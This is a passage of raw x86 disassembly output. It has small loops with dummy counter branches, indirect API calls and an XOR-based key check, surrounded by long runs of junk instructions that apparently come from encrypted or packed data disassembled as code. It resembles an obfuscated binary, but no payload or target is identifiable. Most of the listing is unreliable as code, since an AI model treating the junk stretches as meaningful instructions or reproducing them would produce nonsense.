  406fb0:	cmp    DWORD PTR ds:0x42a885,0x11
  406fb7:	jae    0x407009
  406fbd:	cmp    DWORD PTR ds:0x42a885,0x7
  406fc4:	jne    0x406fe4
  406fca:	push   0x2396
  406fcf:	push   0x42ab22
  406fd4:	push   0x42ab22
  406fd9:	push   0x42ab04
  406fde:	call   DWORD PTR ds:0x41d190
  406fe4:	cmp    DWORD PTR ds:0x42a885,0x6
  406feb:	jne    0x406ffe
  406ff1:	mov    ecx,DWORD PTR ds:0x42a885
  406ff7:	inc    ecx
  406ff8:	mov    DWORD PTR ds:0x42a885,ecx
  406ffe:	jmp    0x406fa3
  407003:	adc    DWORD PTR ds:0x42a7c9,edx
  407009:	mov    DWORD PTR [ebp-0xc],eax
  40700c:	xor    ecx,ecx
  40700e:	add    ecx,DWORD PTR ds:0x42a76d
  407014:	sub    DWORD PTR ds:0x42a841,ecx
  40701a:	jmp    0x407323
  40701f:	cmp    al,0xc4
  407021:	(bad)  
  407022:	rcl    dh,cl
  407024:	rol    ah,cl
  407026:	ficom  DWORD PTR [esi+ebp*2-0xc]
  40702a:	out    0x92,al
  40702c:	sub    BYTE PTR [ebp+0x78cc5815],0x78
  407033:	fs jle 0x4070ae
  407036:	js     0x40702d
  407038:	jg     0x40709b
  40703a:	sar    DWORD PTR [edx-0x14],cl
  40703d:	popa   
  40703e:	xchg   esi,eax
  40703f:	cmp    al,0xc7
  407041:	repz jmp 0xc7f3:0x4648476e
  407049:	hlt    
  40704a:	mov    fs,WORD PTR [esi-0x5faf116]
  407050:	mov    eax,ds:0xf97141ab
  407055:	pop    esi
  407056:	mov    esi,0xcb5d3459
  40705b:	and    BYTE PTR [ebx-0x21],al
  40705e:	scas   al,BYTE PTR es:[edi]
  40705f:	fstp   TBYTE PTR [ebx+0x3ed2ba68]
  407065:	pop    edi
  407066:	sbb    dh,dh
  407068:	repnz xor dh,ch
  40706b:	lods   eax,DWORD PTR ds:[esi]
  40706c:	pop    eax
  40706d:	leave  
  40706e:	fs scas al,BYTE PTR es:[edi]
  407070:	cmc    
  407071:	adc    al,BYTE PTR [ebx]
  407073:	xchg   edi,eax
  407074:	outs   dx,DWORD PTR ds:[esi]
  407075:	test   bh,ch
  407077:	scas   al,BYTE PTR es:[edi]
  407078:	push   edx
  407079:	dec    ebx
  40707a:	stos   BYTE PTR es:[edi],al
  40707b:	pop    edx
  40707c:	imul   esi,DWORD PTR [edx-0x24],0xffffffbd
  407080:	jmp    0xb514:0x6431b672
  407087:	or     al,0xc2
  407089:	js     0x407105
  40708b:	loope  0x4070b8
  40708d:	jg     0x4070af
  40708f:	call   DWORD PTR [esi]
  407091:	mov    esp,0x97b841c6
  407096:	sbb    DWORD PTR [ecx],edi
  407098:	retf   
  407099:	inc    edi
  40709a:	push   0x761cb3f0
  40709f:	sub    eax,0x8b7aee42
  4070a4:	cld    
  4070a5:	call   0x71bcfba2
  4070aa:	es and esi,ebp
  4070ad:	push   ss
  4070ae:	mov    edx,0x32466d7c
  4070b3:	adc    edi,DWORD PTR [edi]
  4070b5:	retf   
  4070b6:	push   eax
  4070b7:	ror    BYTE PTR [edi],cl
  4070b9:	mov    ebx,0x1275bdb5
  4070be:	rcl    BYTE PTR [esi+0x51],0x88
  4070c2:	stos   DWORD PTR es:[edi],eax
  4070c3:	jle    0x40713e
  4070c5:	cs sahf 
  4070c7:	xchg   ebp,eax
  4070c8:	loopne 0x407106
  4070ca:	xchg   esp,eax
  4070cb:	sbb    eax,0x73d9f494
  4070d0:	dec    esp
  4070d1:	(bad)  
  4070d2:	pusha  
  4070d3:	fdiv   QWORD PTR [ebx+0x5833f8ca]
  4070d9:	dec    ecx
  4070da:	retf   0xfbbf
  4070dd:	jmp    0x3bf9:0x42b7f12c
  4070e4:	out    0x7f,al
  4070e6:	inc    edx
  4070e7:	imul   ecx,DWORD PTR [edx+edx*4],0xc5a4db8a
  4070ee:	clc    
  4070ef:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4070f0:	aad    0xb1
  4070f2:	ret    0xad20
  4070f5:	xor    al,BYTE PTR [eax+edx*1+0xa2e50be]
  4070fc:	cmp    DWORD PTR [esi+esi*2],edx
  4070ff:	jnp    0x407131
  407101:	adc    eax,0xa118e744
  407106:	jo     0x4070f1
  407108:	add    al,0x53
  40710a:	(bad)  
  40710c:	arpl   WORD PTR [edx+ebx*2],cx
  40710f:	mov    DWORD PTR [ecx],ebp
  407111:	js     0x407139
  407113:	jl     0x40712e
  407115:	add    BYTE PTR [edx],dh
  407117:	and    ebp,DWORD PTR [ebp+0x4]
  40711a:	into   
  40711b:	jb     0x407150
  40711d:	pushf  
  40711e:	mov    ah,BYTE PTR [ebp-0x58983b46]
  407124:	mov    dh,0xc3
  407126:	xchg   ecx,eax
  407127:	pop    eax
  407128:	add    BYTE PTR [edx-0x7a],ch
  40712b:	mov    ?,WORD PTR ds:0xb2df081e
  407131:	and    dl,BYTE PTR [ebp-0x5d20cd31]
  407137:	in     al,0xb8
  407139:	fs inc ebx
  40713b:	mov    ds:0x6b9173ac,al
  407140:	shl    BYTE PTR [esi+0x77],0x6e
  407144:	and    DWORD PTR [edx],0xb5fd397a
  40714a:	leave  
  40714b:	xchg   ebx,eax
  40714c:	mov    WORD PTR [ebx+eiz*4-0x40],es
  407150:	(bad)  
  407151:	sub    eax,0xa16ea258
  407156:	push   esi
  407157:	nop
  407158:	not    ecx
  40715a:	xchg   edx,eax
  40715b:	mov    ds,edx
  40715d:	shr    DWORD PTR [ebp+0x7],0x0
  407161:	xchg   edx,eax
  407162:	pop    esp
  407163:	in     eax,0xc1
  407165:	das    
  407166:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407167:	push   eax
  407168:	cdq    
  407169:	lea    esi,[edi]
  40716b:	xor    ch,BYTE PTR [ebx]
  40716d:	ds out dx,al
  40716f:	in     al,0x38
  407171:	lods   al,BYTE PTR ds:[esi]
  407172:	unpckhps xmm4,xmm2
  407175:	mov    ds:0xaee701ff,al
  40717a:	sbb    BYTE PTR [edx+edi*4+0x62df4630],dh
  407181:	arpl   WORD PTR [ecx],cx
  407183:	xchg   ecx,eax
  407184:	out    0x3f,eax
  407186:	dec    esi
  407187:	pop    edx
  407188:	push   eax
  407189:	or     al,0x46
  40718b:	mov    cl,0xf9
  40718d:	mov    ebx,0x2576b7a8
  407192:	dec    ecx
  407193:	in     al,0x9c
  407195:	xor    al,BYTE PTR [esi-0x47c5628d]
  40719b:	pushf  
  40719c:	rol    ebx,1
  40719e:	pop    ss
  40719f:	adc    DWORD PTR [ecx+0x75],0xf31f6a58
  4071a6:	test   eax,0xd97fbaf2
  4071ab:	pop    ebp
  4071ac:	test   DWORD PTR [eax+0x1c1d336d],eax
  4071b2:	fisub  WORD PTR ds:[esp+eax*2]
  4071b6:	mov    ebx,0x5f051815
  4071bb:	arpl   si,ax
  4071bd:	jne    0x4071e3
  4071bf:	xor    bl,cl
  4071c1:	mov    ds:0x37b8c0f2,eax
  4071c6:	in     al,dx
  4071c7:	mov    dh,0xef
  4071c9:	pop    edi
  4071ca:	jbe    0x407159
  4071cc:	lea    eax,[ecx]
  4071ce:	adc    BYTE PTR [ebp-0x3e1b91f5],ch
  4071d4:	call   0x1af8:0x2eba2859
  4071db:	xor    DWORD PTR [ebx-0x324a8c3],ebp
  4071e1:	xchg   ebp,eax
  4071e2:	scas   eax,DWORD PTR es:[edi]
  4071e3:	out    0xc,al
  4071e5:	cdq    
  4071e6:	in     al,dx
  4071e7:	daa    
  4071e8:	mov    ecx,0xa3cff2b4
  4071ed:	sbb    dh,BYTE PTR [esp+esi*2-0x6824f6cf]
  4071f4:	outs   dx,BYTE PTR ds:[esi]
  4071f5:	pusha  
  4071f6:	jmp    0xfe580115
  4071fb:	xchg   esp,eax
  4071fc:	push   ds
  4071fd:	inc    ebp
  4071fe:	sbb    bl,BYTE PTR [ecx]
  407200:	aam    0xab
  407202:	xor    eax,ebx
  407204:	inc    edx
  407205:	in     eax,0x74
  407207:	push   ebp
  407208:	pop    es
  407209:	dec    ebx
  40720a:	lods   al,BYTE PTR ds:[esi]
  40720b:	pop    ds
  40720c:	xchg   ebp,eax
  40720d:	ja     0x4071dc
  40720f:	and    esi,DWORD PTR [ebp+0x61d5bcee]
  407215:	fwait
  407216:	in     eax,dx
  407217:	inc    edx
  407218:	mov    dh,0xda
  40721a:	in     al,dx
  40721b:	xchg   ebx,eax
  40721c:	push   eax
  40721d:	xchg   ebx,eax
  40721e:	push   0xc867233b
  407223:	pop    esi
  407224:	sar    DWORD PTR [edi+eax*2+0x3e],0x5d
  407229:	and    BYTE PTR [esi+0x2a],bl
  40722c:	stos   BYTE PTR es:[edi],al
  40722d:	les    edi,FWORD PTR [ecx]
  40722f:	shl    dl,cl
  407231:	in     eax,dx
  407232:	outs   dx,BYTE PTR ds:[esi]
  407233:	outs   dx,BYTE PTR ds:[esi]
  407234:	test   BYTE PTR [edi+0x1a],0x1a
  407238:	(bad)  
  407239:	push   esi
  40723a:	imul   eax,esp,0xfb9450bb
  407240:	sar    BYTE PTR [edx+0x2146433e],0xe
  407247:	or     al,0x74
  407249:	sbb    eax,0x6326dcd2
  40724e:	rcl    ebx,cl
  407250:	rcr    DWORD PTR [ebx-0x6ba2af09],1
  407256:	test   eax,0xede69080
  40725b:	fmul   DWORD PTR [ebp-0x61]
  40725e:	aaa    
  40725f:	dec    ecx
  407260:	jmp    0x40724a
  407262:	out    dx,eax
  407263:	push   ss
  407264:	fcmovnbe st,st(2)
  407266:	les    esi,FWORD PTR [esi+eiz*2-0x28]
  40726a:	rcl    DWORD PTR [edx+0x30],cl
  40726d:	retf   0x7868
  407270:	fmul   st(5),st
  407272:	call   0x7ab8c0ca
  407277:	add    eax,esi
  407279:	dec    edi
  40727a:	pop    ds
  40727b:	retf   
  40727c:	sbb    eax,ebp
  40727e:	xchg   esp,eax
  40727f:	jns    0x407271
  407281:	call   0x70a:0xc1d1b615
  407288:	xchg   edi,eax
  407289:	jne    0x407260
  40728b:	pop    eax
  40728c:	outs   dx,BYTE PTR ds:[esi]
  40728d:	pop    es
  40728e:	push   edi
  40728f:	scas   eax,DWORD PTR es:[edi]
  407290:	adc    DWORD PTR ds:0x7ef3cb0b,0x6d3e18cd
  40729a:	es push ebp
  40729c:	sub    ch,BYTE PTR [ebx+0x294b518a]
  4072a2:	pop    edi
  4072a3:	ds adc eax,DWORD PTR cs:[esi+0x66]
  4072a8:	or     al,0xa4
  4072aa:	adc    al,0xe
  4072ac:	test   DWORD PTR [esi-0x5e],edi
  4072af:	fst    QWORD PTR [eax-0x1e]
  4072b2:	icebp  
  4072b3:	jns    0x407270
  4072b5:	in     eax,0x78
  4072b7:	push   ecx
  4072b8:	pop    esp
  4072b9:	adc    ch,BYTE PTR [esi+0x4d]
  4072bc:	xchg   ebx,eax
  4072be:	cmp    bh,BYTE PTR [eax+ebp*1-0x52673338]
  4072c5:	mov    ebp,0xe948253e
  4072ca:	idiv   DWORD PTR [ebx+edi*2+0x5551a04d]
  4072d1:	add    BYTE PTR [ebx-0x20],0x89
  4072d5:	loop   0x407355
  4072d7:	dec    edx
  4072d8:	or     BYTE PTR [eax],0xc9
  4072db:	cdq    
  4072dc:	add    dl,dl
  4072de:	xor    eax,0xa08964a2
  4072e3:	and    BYTE PTR [edi+0x7b659c00],bh
  4072e9:	inc    esp
  4072ea:	or     bh,ch
  4072ec:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4072ee:	mov    bl,0x2f
  4072f0:	mov    ebx,0x687e001d
  4072f5:	inc    edx
  4072f6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4072f7:	fs or  eax,0x87079fed
  4072fd:	bsr    esi,DWORD PTR [esi-0x5e]
  407301:	or     BYTE PTR [esi-0x17ead69f],0xf6
  407308:	cdq    
  407309:	lods   eax,DWORD PTR ds:[esi]
  40730a:	and    bh,BYTE PTR [ebp-0x78d7da80]
  407310:	mov    ds:0xd37bdf8d,eax
  407315:	cld    
  407316:	jno    0x40734b
  407318:	fistp  WORD PTR [edx]
  40731a:	pop    ds
  40731b:	jnp    0x40739c
  40731d:	or     DWORD PTR [esi],edx
  40731f:	mov    al,ds:0xc6764d1e
  407324:	inc    ebp
  407325:	(bad)  
  407326:	jg     0x4072b5
  407328:	inc    ebp
  407329:	inc    DWORD PTR [ecx+0x42a77925]
  40732f:	add    BYTE PTR [eax],al
  407331:	add    BYTE PTR [eax],al
  407333:	add    cl,ch
  407335:	or     eax,0x8b000000
  40733a:	or     eax,0x42a779
  40733f:	inc    ecx
  407340:	mov    DWORD PTR ds:0x42a779,ecx
  407346:	cmp    DWORD PTR ds:0x42a779,0x14
  40734d:	jae    0x4076a2
  407353:	cmp    DWORD PTR ds:0x42a779,0x4
  40735a:	jne    0x407378
  407360:	push   0x42a889
  407365:	push   0x360b
  40736a:	push   DWORD PTR [ebp-0x20]
  40736d:	push   0x8b40
  407372:	call   DWORD PTR ds:0x41d194
  407378:	cmp    DWORD PTR ds:0x42a779,0x3
  40737f:	jne    0x407394
  407385:	xor    ecx,ecx
  407387:	xor    ecx,DWORD PTR ds:0x42a779
  40738d:	inc    ecx
  40738e:	mov    DWORD PTR ds:0x42a779,ecx
  407394:	jmp    0x407339
  407399:	jmp    0x4076a2
  40739e:	iret   
  40739f:	retf   0xced7
  4073a2:	(bad)  
  4073a4:	aad    0xc9
  4073a6:	in     eax,0x5e
  4073a8:	mov    DWORD PTR ds:0x2505b650,esp
  4073ae:	inc    esp
  4073af:	sar    DWORD PTR [eax+0x78],1
  4073b2:	fs jle 0x40742d
  4073b5:	js     0x40736a
  4073b7:	xor    al,0x2e
  4073b9:	inc    edi
  4073ba:	inc    esi
  4073bb:	mov    dl,0x75
  4073bd:	inc    edi
  4073be:	jmp    0x4073fc
  4073c0:	addr16 adc al,0xc
  4073c3:	fs dec esi
  4073c5:	mov    eax,DWORD PTR [ebx*8-0x7c212b17]
  4073cc:	ret    0xfb4e
  4073cf:	cli    
  4073d0:	push   ds
  4073d1:	mov    esp,0x75b6ecde
  4073d6:	loop   0x407364
  4073d8:	aas    
  4073d9:	not    DWORD PTR [esi+0x4ebafe7b]
  4073df:	fs mov ch,0x4c
  4073e2:	pop    esi
  4073e3:	add    edx,DWORD PTR [ebp-0x71b0a3fa]
  4073e9:	cmp    al,0xea
  4073eb:	push   edx
  4073ec:	outs   dx,DWORD PTR ds:[esi]
  4073ed:	mov    ch,0x2
  4073ef:	jl     0x40742d
  4073f1:	cmp    dh,BYTE PTR [esp+ebx*4+0x6a3f5d74]
  4073f8:	lock bound esi,QWORD PTR [edx]
  4073fb:	inc    esi
  4073fc:	pop    esi
  4073fd:	xchg   esp,edi
  4073ff:	adc    al,0xde
  407401:	loope  0x407458
  407403:	pop    es
  407404:	push   esi
  407405:	and    al,BYTE PTR [eax-0x11883046]
  40740b:	push   edx
  40740c:	iret   
  40740d:	popf   
  40740e:	cmp    DWORD PTR ds:[ecx],0xd060358a
  407415:	xor    DWORD PTR [edx],ebp
  407417:	mov    ds:0x781ce7ad,eax
  40741c:	adc    BYTE PTR [esi],dh
  40741e:	ficomp DWORD PTR [ebx+0x7e]
  407421:	daa    
  407422:	(bad)  
  407423:	inc    ebp
  407424:	pop    ebp
  407425:	jp     0x407465
  407427:	cmp    eax,0xd5f213f8
  40742c:	add    al,0x81
  40742e:	lods   eax,DWORD PTR ds:[esi]
  40742f:	rcr    edx,cl
  407431:	fld    QWORD PTR [edi]
  407433:	fld    QWORD PTR [edi-0xb]
  407436:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407437:	int    0x12
  407439:	mov    ebp,0xd407d5df
  40743e:	fdiv   st,st(5)
  407440:	call   0xa4c6:0x650f6439
  407447:	int3   
  407448:	mov    WORD PTR [edx-0x49],cs
  40744b:	or     DWORD PTR [edi+ebx*2-0x5b1d578d],edi
  407452:	mov    bh,0x4c
  407454:	and    bl,BYTE PTR [ecx+0x79]
  407457:	xchg   esi,eax
  407458:	mov    ah,0xa0
  40745a:	and    dl,BYTE PTR [edi]
  40745c:	adc    al,0x31
  40745e:	xor    DWORD PTR [eax-0x5bd7975c],eax
  407464:	sub    BYTE PTR [edi+edi*8-0x62],dl
  407468:	push   ebx
  407469:	sub    edi,DWORD PTR [eax+0x78]
  40746c:	pusha  
  40746d:	add    ebp,DWORD PTR [ecx+ebx*1]
  407470:	dec    edi
  407471:	in     eax,dx
  407472:	iret   
  407473:	lea    ebx,[ebp+0x7]
  407476:	popf   
  407477:	mov    al,0x70
  407479:	mov    al,ds:0x679d56b6
  40747e:	pop    ebp
  40747f:	mov    al,BYTE PTR [ebx+0x503b910f]
  407485:	inc    eax
  407486:	dec    esi
  407487:	push   0xa7994e90
  40748c:	hlt    
  40748d:	(bad)  
  40748e:	daa    
  40748f:	cmp    ah,ah
  407491:	in     eax,dx
  407492:	aaa    
  407493:	cmp    esi,esi
  407495:	adc    al,BYTE PTR [ecx+0x5aede027]
  40749b:	fsubr  QWORD PTR [edx-0xbe65e49]
  4074a1:	(bad)
  4074a4:	outs   dx,BYTE PTR ds:[esi]
  4074a5:	call   0xbc2c:0x6801bf0e
  4074ac:	xchg   edi,ebx
  4074ae:	mov    esp,0x7b4441af
  4074b3:	int    0x89
  4074b5:	cmp    al,0x6c
  4074b7:	sub    bh,bh
  4074b9:	add    ebx,DWORD PTR [edi]
  4074bb:	jge    0x407486
  4074bd:	rol    edx,cl
  4074bf:	sti    
  4074c0:	js     0x407509
  4074c2:	cli    
  4074c3:	(bad)  [edx+eiz*1-0x185be728]
  4074ca:	data16 jno 0x40746e
  4074cd:	stc    
  4074ce:	jne    0x407463
  4074d0:	outs   dx,BYTE PTR ds:[esi]
  4074d1:	xor    DWORD PTR [edx],eax
  4074d3:	add    edi,DWORD PTR [ebx+0x10]
  4074d6:	add    BYTE PTR [ecx+ecx*2+0x11d81f46],cl
  4074dd:	outs   dx,DWORD PTR ds:[esi]
  4074de:	cmp    DWORD PTR [ebx-0xe],ebp
  4074e1:	int3   
  4074e2:	mov    eax,0xf6b6093a
  4074e7:	std    
  4074e8:	pop    edi
  4074e9:	or     BYTE PTR [edi+0x60c66171],0xcb
  4074f0:	pop    es
  4074f1:	cmp    ch,cl
  4074f3:	fadd   DWORD PTR [eax+0x10455f2c]
  4074f9:	jbe    0x407524
  4074fb:	jb     0x407492
  4074fd:	int3   
  4074fe:	xlat   BYTE PTR ds:[ebx]
  4074ff:	sbb    ebx,edi
  407501:	or     eax,0x61083149
  407506:	sub    al,0xed
  407508:	jnp    0x4074e6
  40750a:	outs   dx,BYTE PTR ds:[esi]
  40750b:	dec    edx
  40750c:	sar    DWORD PTR [edi-0x3b],cl
  40750f:	adc    eax,0x34a000a8
  407514:	mov    ebx,DWORD PTR [edi+0x34]
  407517:	retf   
  407518:	inc    edx
  407519:	mov    ah,BYTE PTR [edx+0x7c]
  40751c:	mov    dh,0x58
  40751e:	stos   DWORD PTR es:[edi],eax
  40751f:	ss jne 0x407574
  407522:	pop    es
  407523:	scas   eax,DWORD PTR es:[edi]
  407524:	mov    ds:0xcb7486e2,eax
  407529:	ret    
  40752a:	icebp  
  40752b:	mov    BYTE PTR [edx-0x12],bh
  40752e:	rcr    BYTE PTR [ebp-0x9297d9],0x69
  407535:	jmp    0xa200f3f7
  40753a:	ficom  DWORD PTR [edi-0x27]
  40753d:	retf   0x14d1
  407540:	in     al,0x3a
  407542:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407543:	dec    eax
  407544:	in     al,0x26
  407546:	repz dec esp
  407548:	add    edx,edi
  40754a:	inc    eax
  40754b:	ret    0xdea4
  40754e:	push   ds
  40754f:	into   
  407550:	xlat   BYTE PTR ds:[ebx]
  407551:	and    DWORD PTR [eax+0x56b21146],esp
  407557:	adc    cl,cl
  407559:	cld    
  40755a:	fidivr WORD PTR [ecx+0x5dac50bd]
  407560:	xchg   ebx,eax
  407561:	loopne 0x4075d6
  407563:	scas   al,BYTE PTR es:[edi]
  407564:	(bad)  
  407565:	pushf  
  407566:	push   ecx
  407567:	adc    DWORD PTR [edi-0x5fae35d8],esi
  40756d:	mov    dh,0xca
  40756f:	fcmovb st,st(0)
  407571:	mov    dl,0x85
  407573:	xor    al,0x85
  407575:	loopne 0x4075b0
  407577:	in     al,0x68
  407579:	xchg   ecx,eax
  40757a:	mov    ch,0xe6
  40757c:	jg     0x4075bc
  40757e:	arpl   WORD PTR [esi-0x5f],cx
  407581:	in     eax,dx
  407582:	sub    eax,0x323b4a89
  407587:	push   eax
  407588:	rcl    DWORD PTR [eax],cl
  40758a:	test   ebx,edx
  40758c:	aas    
  40758d:	dec    ebx
  40758e:	and    eax,0x72ff74f0
  407593:	int    0x34
  407595:	es mov ebx,0xcffe8e29
  40759b:	push   ebp
  40759c:	sub    BYTE PTR [esi+ebx*2+0x29212bc4],ch
  4075a3:	cmp    BYTE PTR [ecx+0x19230150],dh
  4075a9:	jns    0x407551
  4075ab:	push   ds
  4075ac:	sub    DWORD PTR [edi+0x13bd0035],0x53aab8ed
  4075b6:	add    BYTE PTR [ecx+edi*8],ch
  4075b9:	mov    al,0x87
  4075bb:	push   es
  4075bc:	loopne 0x4075ad
  4075be:	inc    edi
  4075bf:	idiv   BYTE PTR [eax]
  4075c1:	and    BYTE PTR [edi-0x2e],dh
  4075c4:	les    esp,FWORD PTR [esi-0x14f7ec8e]
  4075ca:	sbb    edx,DWORD PTR [edi+0x38]
  4075cd:	or     BYTE PTR [ebx-0x3f],ch
  4075d0:	outs   dx,BYTE PTR ds:[esi]
  4075d1:	jbe    0x4075b7
  4075d3:	imul   ebx,ebx,0xffffffa2
  4075d6:	shr    DWORD PTR [edx+0x6307ec9f],1
  4075dc:	(bad)  
  4075dd:	sbb    eax,0xfada77e3
  4075e2:	repz lds esp,FWORD PTR [eax-0x38]
  4075e6:	mov    edx,esi
  4075e8:	mov    ecx,0x1ddedb4b
  4075ed:	(bad)  
  4075ee:	in     al,0x17
  4075f0:	add    ch,ah
  4075f2:	jbe    0x4075dc
  4075f4:	rcr    eax,cl
  4075f6:	add    DWORD PTR [eax],0x74f50f79
  4075fc:	cmc    
  4075fd:	mov    ebx,0x5bb1780f
  407602:	out    dx,eax
  407603:	mov    al,ds:0x37e5f0a2
  407608:	adc    ah,BYTE PTR [ecx+0xd]
  40760b:	loope  0x4075fd
  40760d:	push   cs
  40760e:	inc    ebx
  40760f:	sub    DWORD PTR [eax+ebx*2+0x63],esi
  407613:	popa   
  407614:	(bad)
  407619:	mov    eax,ds:0xf1623ac2
  40761e:	adc    eax,0x5b244006
  407623:	retf   
  407624:	sub    eax,0x45ff75d2
  407629:	(bad)  
  40762a:	pop    esp
  40762b:	xor    DWORD PTR [ebx],ebp
  40762d:	dec    eax
  40762e:	sahf   
  40762f:	pop    esi
  407630:	je     0x407651
  407632:	addr16 pusha 
  407634:	cmp    eax,0x6d8ac3bb
  407639:	inc    eax
  40763a:	jno    0x4076ba
  40763c:	or     al,0x54
  40763e:	rcl    ecx,cl
  407640:	sub    al,0xbf
  407642:	fsub   QWORD PTR [ebp+0x66]
  407645:	xor    BYTE PTR [ebx+0x6c],dh
  407648:	push   0xfffffff5
  40764a:	jne    0x407619
  40764c:	and    DWORD PTR [edi+0x2ff3e421],0xf997b2c
  407656:	outs   dx,DWORD PTR ds:[esi]
  407657:	push   es
  407658:	xchg   esi,eax
  407659:	jns    0x40768f
  40765b:	and    al,0x1d
  40765d:	adc    BYTE PTR [ebx+ebx*4],ch
  407660:	ret    0xd751
  407663:	push   0x54
  407665:	push   ebx
  407666:	or     eax,0xd2272861
  40766b:	test   DWORD PTR [ecx],0x4bb9250b
  407671:	xor    BYTE PTR [ecx-0x33],bl
  407674:	mov    bh,0x83
  407676:	pusha  
  407677:	test   al,0xeb
  407679:	xchg   ebp,eax
  40767a:	out    dx,eax
  40767b:	inc    esi
  40767c:	loopne 0x4076f7
  40767e:	sub    cl,bh
  407680:	lds    edi,FWORD PTR [ecx+0x57ff03ea]
  407686:	xchg   edi,eax
  407687:	scas   eax,DWORD PTR es:[edi]
  407688:	leave  
  407689:	fsubr  st(6),st
  40768b:	sbb    ebx,DWORD PTR [ebx+0x1b]
  40768e:	into   
  40768f:	lods   al,BYTE PTR ds:[esi]
  407690:	pop    ds
  407691:	aaa    
  407692:	sub    eax,ebx
  407694:	jb     0x40762a
  407696:	aaa    
  407697:	inc    ebp
  407698:	bound  esp,QWORD PTR [esi-0xd]
  40769b:	out    0xf1,al
  40769d:	dec    edi
  40769e:	ror    DWORD PTR [edx+0xb],cl
  4076a1:	clc    
  4076a2:	mov    DWORD PTR [ebp-0x10],eax
  4076a5:	mov    al,BYTE PTR [ebp-0x1]
  4076a8:	or     DWORD PTR ds:0x42a761,0x6cf8
  4076b2:	mov    ecx,DWORD PTR [ebp-0x10]
  4076b5:	xor    al,0x43
  4076b7:	sub    al,0x3b
  4076b9:	sbb    DWORD PTR ds:0x42a83d,0x42a77d
  4076c3:	mov    BYTE PTR [ecx],al
  4076c5:	mov    DWORD PTR [ebp-0x8],0xf89c8538
  4076cc:	and    DWORD PTR ds:0x42a7b9,0x0
  4076d6:	jmp    0x4076e8
  4076db:	mov    ecx,DWORD PTR ds:0x42a7b9
  4076e1:	inc    ecx
  4076e2:	mov    DWORD PTR ds:0x42a7b9,ecx
  4076e8:	cmp    DWORD PTR ds:0x42a7b9,0x12
  4076ef:	jae    0x40772f
  4076f5:	cmp    DWORD PTR ds:0x42a7b9,0xa
  4076fc:	jne    0x407710
  407702:	push   DWORD PTR [ebp-0xc]
  407705:	push   0x84c8
  40770a:	call   DWORD PTR ds:0x41d0c4
  407710:	cmp    DWORD PTR ds:0x42a7b9,0x9
  407717:	jne    0x40772a
  40771d:	mov    ecx,DWORD PTR ds:0x42a7b9
  407723:	inc    ecx
  407724:	mov    DWORD PTR ds:0x42a7b9,ecx
  40772a:	jmp    0x4076db
  40772f:	mov    DWORD PTR [ebp-0x10],0xf89c8539
  407736:	mov    eax,DWORD PTR [ebp-0x8]
  407739:	mov    ecx,0x7510850
  40773e:	push   esi
  40773f:	xor    eax,ecx
  407741:	mov    esi,0x327298
  407746:	add    eax,esi
  407748:	jmp    0x407755
  40774d:	mov    dl,BYTE PTR [ebp-0x1]
  407750:	mov    BYTE PTR [ebp+eax*1-0x58],dl
  407754:	inc    eax
  407755:	cmp    eax,0x40
  407758:	jb     0x40774d
  40775e:	mov    edx,DWORD PTR [ebp-0x8]
  407761:	mov    eax,DWORD PTR [ebp-0xc]
  407764:	xor    edx,ecx
  407766:	add    edx,esi
  407768:	cmp    edx,eax
  40776a:	je     0x407dc2
  407770:	push   ebx
  407771:	push   edi
  407772:	mov    edi,DWORD PTR [ebp+0x8]
  407775:	mov    eax,0x8a36
  40777a:	xor    ax,WORD PTR [edi+edx*4+0x2]
  40777f:	mov    edi,0x3afc
  407784:	jmp    0x407a8d
  407789:	cmp    al,0xc2
  40778b:	cmp    al,0xd3
  40778d:	ret    0xd3d1
  407790:	shl    DWORD PTR [edx+0x6eae76e8],1
  407796:	mov    ebp,0xd6b08b48
  40779b:	js     0x407815
  40779d:	fs jle 0x407818
  4077a0:	js     0x4077e4
  4077a2:	pushf  
  4077a3:	pop    edx
  4077a4:	not    BYTE PTR [edx-0x73]
  4077a7:	xor    bl,BYTE PTR [ebx]
  4077a9:	je     0x40773e
  4077ab:	xchg   esi,eax
  4077ac:	sub    ebx,ebx
  4077ae:	dec    esi
  4077af:	jnp    0x407801
  4077b1:	and    esi,DWORD PTR [edx]
  4077b3:	xchg   BYTE PTR [ecx-0x50c84193],dl
  4077b9:	jge    0x407819
  4077bb:	mov    WORD PTR [ecx],ss
  4077bd:	cmp    al,0x2
  4077bf:	mov    bh,0x99
  4077c1:	test   al,0x9d
  4077c3:	mov    WORD PTR [esi+0x6977f23],cs
  4077c9:	outs   dx,BYTE PTR ds:[esi]
  4077ca:	jno    0x407828
  4077cc:	dec    ebp
  4077cd:	lahf   
  4077ce:	pop    ebx
  4077cf:	and    al,0xab
  4077d1:	inc    eax
  4077d2:	mov    cl,0xf3
  4077d4:	jecxz  0x4077b3
  4077d6:	in     eax,dx
  4077d7:	push   edx
  4077d8:	imul   DWORD PTR [esi]
  4077da:	out    dx,eax
  4077db:	hlt    
  4077dc:	lods   al,BYTE PTR ds:[esi]
  4077dd:	fucomi st,st(5)
  4077df:	xor    DWORD PTR [ebp+0x75],ebx
  4077e2:	push   ds
  4077e3:	mov    ebx,DWORD PTR ds:0x8bf2e2a0
  4077e9:	iret   
  4077ea:	int3   
  4077eb:	mov    edx,0x2da1c44b
  4077f0:	and    BYTE PTR [ebx-0x55],cl
  4077f3:	pop    ss
  4077f4:	les    ebx,FWORD PTR [esi+0x2fd24b3e]
  4077fa:	aaa    
  4077fb:	clc    
  4077fc:	int    0xbf
  4077fe:	jmp    0xef54:0x9e5a49c4
  407805:	pop    ecx
  407806:	out    dx,al
  407807:	sbb    eax,0x2edb0257
  40780c:	add    eax,0x30e53a02
  407811:	sbb    edi,DWORD PTR [ecx-0x531c5a2f]
  407817:	pushf  
  407818:	inc    ebp
  407819:	inc    esi
  40781a:	mov    ebx,0xe6d6614d
  40781f:	test   DWORD PTR [ebp+esi*2+0x5f],edi
  407823:	int    0x55
  407825:	dec    esi
  407826:	test   BYTE PTR gs:[edi+edx*8-0x72],bh
  40782b:	lahf   
  40782c:	adc    al,0x6d
  40782e:	out    dx,al
  40782f:	or     al,0xcb
  407831:	sub    eax,0xdebf77c
  407836:	xor    dh,BYTE PTR [ebp+0x6b404e71]
  40783c:	cmp    edx,edi
  40783e:	sbb    BYTE PTR [ecx+esi*8-0x2efbdce6],bh
